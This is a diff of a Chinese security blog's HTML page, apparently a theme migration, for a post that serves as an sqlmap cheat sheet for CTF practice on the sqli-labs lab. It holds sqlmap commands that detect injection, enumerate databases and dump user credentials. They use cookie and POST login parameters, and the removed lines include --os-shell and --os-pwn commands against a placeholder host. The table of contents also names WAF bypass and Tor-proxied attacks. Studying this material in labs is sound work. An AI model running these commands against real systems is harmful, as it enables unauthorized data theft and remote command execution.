@@ -1,244 +1,301 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="osword">
-  <meta name="keywords" content="">
-  <title>sqlmap操作详解(常用备忘录) - osword&#39;s blog</title>
+    
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+    
+
+    
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  
+    <meta charset="utf-8">
     
     
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-  
+    
+    <title>sqlmap操作详解(常用备忘录) | osword&#39;s blog | 小刀</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="SQL注入">
+    <meta name="description" content="前言以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新 常规盲注爆库爆表爆列爆字段（适用较多数据库类型）判断能否注入sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.195&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap操作详解(常用备忘录)">
+<meta property="og:url" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/index.html">
+<meta property="og:site_name" content="osword&#39;s blog">
+<meta property="og:description" content="前言以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新 常规盲注爆库爆表爆列爆字段（适用较多数据库类型）判断能否注入sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.195&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/1.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/2.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/3.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/4.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/5.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/6.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/7.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/8.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/9.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/10.png">
+<meta property="article:published_time" content="2019-02-25T12:51:41.000Z">
+<meta property="article:modified_time" content="2020-05-15T08:31:22.000Z">
+<meta property="article:author" content="osword">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
+    
 
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+    <div id="loading" class="active"></div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">osword</h5>
+          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
+            <li class="waves-block waves-effect">
+              <a href="https://zhzhdoai.github.io/"  >
+                <i class="icon icon-lg icon-友链"></i>
+                友链
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
+            <li class="waves-block waves-effect">
+              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-glotozz"></i>
+                Glotozz
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
+            <li class="waves-block waves-effect">
+              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-sommus"></i>
+                Sommus
               </a>
             </li>
-          
         
+            <li class="waves-block waves-effect">
+              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-mochazz@七月火"></i>
+                Mochazz 七月火
+              </a>
+            </li>
         
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-tea9"></i>
+                Tea 9
+              </a>
+            </li>
         
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-Decade"></i>
+                Decade
+              </a>
+            </li>
         
       </ul>
     </div>
   </div>
-</nav>
+</aside>
 
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2019-02-25 20:51" pubdate>
-        2019年2月25日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      3.3k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      47
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">sqlmap操作详解(常用备忘录)</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
         </div>
-      </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
     </div>
-  </header>
+</header>
+<header class="content-header post-header">
 
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">sqlmap操作详解(常用备忘录)</h1>
+    <div class="container fade-scale">
+        <h1 class="title">sqlmap操作详解(常用备忘录)</h1>
+        <h5 class="subtitle">
             
-            <div class="markdown-body" id="post-body">
-              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新</p>
-<h1 id="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><a href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）" class="headerlink" title="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"></a>常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</h1><h2 id="判断能否注入"><a href="#判断能否注入" class="headerlink" title="判断能否注入"></a>判断能否注入</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot;</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
-<h2 id="猜解表"><a href="#猜解表" class="headerlink" title="猜解表"></a>猜解表</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables</code><br>》》指定数据库表名<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables -D security</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
-<h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --columns -T users</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
-<h2 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --dump -T users -C &quot;username,password,id&quot;</code><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="利用cookies"><a href="#利用cookies" class="headerlink" title="利用cookies"></a>利用cookies</h1><p><img src="./5.png" srcset="/img/loading.gif" alt=""><br><code>--level</code> 2 枚举强度<br><code>--cookie</code> “uname=admin” 可注入点<br>在<code>sqlilabs Less20</code>下实验</p>
-<h2 id="尝试是否存在注入"><a href="#尝试是否存在注入" class="headerlink" title="尝试是否存在注入"></a>尝试是否存在注入</h2><p><code>sqlmap &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --level 2</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p>
-<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --tables --level 2</code><br><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="SQLmap用于mysql注入"><a href="#SQLmap用于mysql注入" class="headerlink" title="SQLmap用于mysql注入"></a>SQLmap用于mysql注入</h1><p>(1)查找数据库<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --dbs</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""><br>(2)通过第一步的数据库查找表<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --D security --tables</code><br>(3)通过表名查列名<br> <code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users --columns</code><br>(4) 通过列查字段<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users -C “id,user,password” --dump</code></p>
-<h1 id="sqlmap中post登陆框注入"><a href="#sqlmap中post登陆框注入" class="headerlink" title="sqlmap中post登陆框注入"></a>sqlmap中post登陆框注入</h1><p>(1) sqlmap -u “<a href="http://192.168.43.195/sqlilabs/Less-17&quot;" target="_blank" rel="noopener">http://192.168.43.195/sqlilabs/Less-17&quot;</a> –data “uname=1&amp;passwd=1”<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="交互式-shell"><a href="#交互式-shell" class="headerlink" title="交互式 shell"></a>交互式 shell</h1><p>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-cmd “ipconfig”<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-shell<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-pwn<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –sql-shell<br><strong>条件绝对路径+注入点</strong><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p>
+                <time datetime="2019-02-25T12:51:41.000Z" itemprop="datePublished" class="page-time">
+  2019-02-25
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><span class="post-toc-number">2.</span> <span class="post-toc-text">常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#判断能否注入"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">判断能否注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#猜解表"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">猜解表</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#猜解列名"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">猜解列名</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#猜解字段"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">猜解字段</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用cookies"><span class="post-toc-number">3.</span> <span class="post-toc-text">利用cookies</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#尝试是否存在注入"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">尝试是否存在注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#爆库"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">爆库</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQLmap用于mysql注入"><span class="post-toc-number">4.</span> <span class="post-toc-text">SQLmap用于mysql注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sqlmap中post登陆框注入"><span class="post-toc-number">5.</span> <span class="post-toc-text">sqlmap中post登陆框注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#交互式-shell"><span class="post-toc-number">6.</span> <span class="post-toc-text">交互式 shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#伪静态网页注入"><span class="post-toc-number">7.</span> <span class="post-toc-text">伪静态网页注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sqlmap绕过WAF防火墙"><span class="post-toc-number">8.</span> <span class="post-toc-text">sqlmap绕过WAF防火墙</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Tor代理与跳板"><span class="post-toc-number">9.</span> <span class="post-toc-text">Tor代理与跳板</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#使用-Tor-网络当连接到目标网站攻击"><span class="post-toc-number">10.</span> <span class="post-toc-text">使用 Tor 网络当连接到目标网站攻击</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#任意注射点"><span class="post-toc-number">11.</span> <span class="post-toc-text">任意注射点</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#定制注射负载"><span class="post-toc-number">12.</span> <span class="post-toc-text">定制注射负载</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#水平选择"><span class="post-toc-number">13.</span> <span class="post-toc-text">水平选择</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#页面比较"><span class="post-toc-number">14.</span> <span class="post-toc-text">页面比较</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sql注入技术选择"><span class="post-toc-number">15.</span> <span class="post-toc-text">sql注入技术选择</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#union查询中的sql注入条件修改"><span class="post-toc-number">16.</span> <span class="post-toc-text">union查询中的sql注入条件修改</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#注入文件xml学习"><span class="post-toc-number">17.</span> <span class="post-toc-text">注入文件xml学习</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#列出数据库信息-包含列出库表列"><span class="post-toc-number">18.</span> <span class="post-toc-text">列出数据库信息(包含列出库表列)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–current-user-：会话用户查询"><span class="post-toc-number">18.1.</span> <span class="post-toc-text">–current-user ：会话用户查询</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–current-db-当前数据库"><span class="post-toc-number">18.2.</span> <span class="post-toc-text">–current-db : 当前数据库</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–hostname-服务器主机名"><span class="post-toc-number">18.3.</span> <span class="post-toc-text">–hostname : 服务器主机名</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–is-dba-检测会话用户是否是数据库管理员"><span class="post-toc-number">18.4.</span> <span class="post-toc-text">–is-dba : 检测会话用户是否是数据库管理员</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–users-：-列出数据库管理系统用户"><span class="post-toc-number">18.5.</span> <span class="post-toc-text">–users ： 列出数据库管理系统用户</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–passwords-列出并列出数据库管理员用户的密码hash"><span class="post-toc-number">18.6.</span> <span class="post-toc-text">–passwords : 列出并列出数据库管理员用户的密码hash</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–privileges-：列出数据库管理系统用户权限"><span class="post-toc-number">18.7.</span> <span class="post-toc-text">–privileges ：列出数据库管理系统用户权限</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#–roles-：列出数据库管理系统用户角色"><span class="post-toc-number">18.8.</span> <span class="post-toc-text">–roles ：列出数据库管理系统用户角色</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#列出除系统数据库以外的表"><span class="post-toc-number">18.9.</span> <span class="post-toc-text">列出除系统数据库以外的表</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#转存数据库表目"><span class="post-toc-number">19.</span> <span class="post-toc-text">转存数据库表目</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#运行自定义SQL语句"><span class="post-toc-number">20.</span> <span class="post-toc-text">运行自定义SQL语句</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#新用户运行可执行命令"><span class="post-toc-number">21.</span> <span class="post-toc-text">新用户运行可执行命令</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#搜索数据库常用参数整理"><span class="post-toc-number">22.</span> <span class="post-toc-text">搜索数据库常用参数整理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#–temper选择总结"><span class="post-toc-number">23.</span> <span class="post-toc-text">–temper选择总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-sqlmap操作(sqlilabs)"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">sqlmap操作详解(常用备忘录)</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-02-25 20:51:41" datetime="2019-02-25T12:51:41.000Z"  itemprop="datePublished">2019-02-25</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新</p>
+<h1 id="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><a href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）" class="headerlink" title="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"></a>常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</h1><h2 id="判断能否注入"><a href="#判断能否注入" class="headerlink" title="判断能否注入"></a>判断能否注入</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="猜解表"><a href="#猜解表" class="headerlink" title="猜解表"></a>猜解表</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables</code><br>》》指定数据库表名<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables -D security</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --columns -T users</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --dump -T users -C &quot;username,password,id&quot;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h1 id="利用cookies"><a href="#利用cookies" class="headerlink" title="利用cookies"></a>利用cookies</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p><code>--level</code> 2 枚举强度<br><code>--cookie</code> “uname=admin” 可注入点<br>在<code>sqlilabs Less20</code>下实验</p>
+<h2 id="尝试是否存在注入"><a href="#尝试是否存在注入" class="headerlink" title="尝试是否存在注入"></a>尝试是否存在注入</h2><p><code>sqlmap &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --level 2</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --tables --level 2</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h1 id="SQLmap用于mysql注入"><a href="#SQLmap用于mysql注入" class="headerlink" title="SQLmap用于mysql注入"></a>SQLmap用于mysql注入</h1><p>(1)查找数据库<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --dbs</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>(2)通过第一步的数据库查找表<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --D security --tables</code><br>(3)通过表名查列名<br> <code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users --columns</code><br>(4) 通过列查字段<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users -C “id,user,password” --dump</code></p>
+<h1 id="sqlmap中post登陆框注入"><a href="#sqlmap中post登陆框注入" class="headerlink" title="sqlmap中post登陆框注入"></a>sqlmap中post登陆框注入</h1><p>(1) sqlmap -u “<a href="http://192.168.43.195/sqlilabs/Less-17&quot;" target="_blank" rel="noopener">http://192.168.43.195/sqlilabs/Less-17&quot;</a> –data “uname=1&amp;passwd=1”</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
